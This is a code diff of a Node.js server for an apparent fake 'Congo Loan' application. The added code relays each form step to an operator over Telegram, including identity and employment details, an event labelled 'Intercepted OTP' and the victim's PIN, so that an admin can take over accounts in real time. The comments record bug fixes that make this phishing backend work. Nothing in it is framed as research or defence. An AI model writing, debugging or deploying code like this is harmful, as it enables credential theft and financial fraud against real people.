@@ -1,104 +1,88 @@
+require('dotenv').config();
 const express = require('express');
 const http = require('http');
-const { Server } = require('socket.io');
+const socketIo = require('socket.io');
 const path = require('path');
+const cors = require('cors');
+
+const botManager = require('./bot_manager');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, {
+
+// Configure Socket.io for Render (CORS is essential)
+const io = socketIo(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
     }
 });
 
-// Share io globally so bot_manager.js can access it
-global.io = io;
+global.io = io; // Link socket globally so botManager can call back rooms
 
+const PORT = process.env.PORT || 3000;
+const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
+
+app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Mock database / session store
-const sessions = new Map();
-
-function generateAppId() {
-    return 'COD-' + Math.random().toString(36).substring(2, 7).toUpperCase();
-}
-
-// REST Endpoints for frontend fallback or validation
-app.post('/api/initialize', (req, res) => {
-    const appId = generateAppId();
-    sessions.set(appId, { appId, step: 1, created_at: Date.now() });
-    res.json({ success: true, appId });
-});
-
-// Telegram Webhook Endpoint
-app.post('/telegram-webhook', (req, res) => {
-    // Forward to bot manager handler if structured that way
+// Webhook Route for Telegram
+app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
+    botManager.bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
-// Socket.IO Connection Logic
 io.on('connection', (socket) => {
-    const appId = generateAppId();
-    sessions.set(appId, { appId, socketId: socket.id, step: 1 });
+    // Generate unique Congo application session tag
+    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
-    // Send initial session data back to client
-    socket.emit('session-ready', { appId });
+    // Send AppID back to the frontend right away
+    socket.emit('session-ready', { appId: appId });
 
-    // FIX ADDED: Join room listener with live state auditing logs
+    // FIX BUG 3 & 4: Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
     socket.on('join-room', (room) => {
         socket.join(room);
-
-        console.log(`✅ User joined room: ${room}`);
-
-        const rooms = global.io.sockets.adapter.rooms;
-        console.log('ROOM EXISTS:', rooms.has(room));
+        console.log(`🔌 Congo User joined room: ${room}`);
     });
 
-    socket.on('step1', (data) => {
-        if (sessions.has(data.appId)) {
-            let session = sessions.get(data.appId);
-            Object.assign(session, data, { step: 2 });
-            sessions.set(data.appId, session);
-        }
-    });
-
-    socket.on('step2', (data) => {
-        if (sessions.has(data.appId)) {
-            let session = sessions.get(data.appId);
-            Object.assign(session, data, { step: 3 });
-            sessions.set(data.appId, session);
-        }
-    });
-
+    // Standard Log Streams
+    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
+    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
+    
+    // FIX BUG 1: Matched to frontend event 'step3-data'
     socket.on('step3-data', (data) => {
-        if (sessions.has(data.appId)) {
-            let session = sessions.get(data.appId);
-            Object.assign(session, data, { step: 4 });
-            sessions.set(data.appId, session);
-            
-            // Trigger external notifications (like Telegram alert) here
-        }
+        botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false);
     });
 
+    // FIX BUG 1: Matched to frontend event 'step4-otp'
     socket.on('step4-otp', (data) => {
-        // Keeps state spinning on frontend until admin manual action triggers via Telegram
-        console.log(`Recieved OTP submission for application context room.`);
+        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
     });
 
+    // FIX BUG 1 & 6: Matched to frontend event 'step5-pin' and extracts data.pin correctly
     socket.on('step5-pin', (data) => {
-        const referenceId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
-        socket.emit('pin-verified', { referenceId });
+        botManager.sendFinalApproval(appId, data.pin);
     });
 
     socket.on('disconnect', () => {
-        // Clean up logic if needed
+        console.log(`🔌 User disconnected: ${appId}`);
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Server running securely on port ${PORT}`);
+server.listen(PORT, async () => {
+    console.log(`🚀 Congo Loan Server running on port ${PORT}`);
+    
+    // Auto-configure Webhooks on deployment platforms like Render
+    if (EXTERNAL_URL) {
+        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
+        try {
+            await botManager.bot.setWebHook(webhookUrl);
+            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
+        } catch (err) {
+            console.error('❌ Webhook Setup Failed:', err.message);
+        }
+    } else {
+        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
+    }
 });
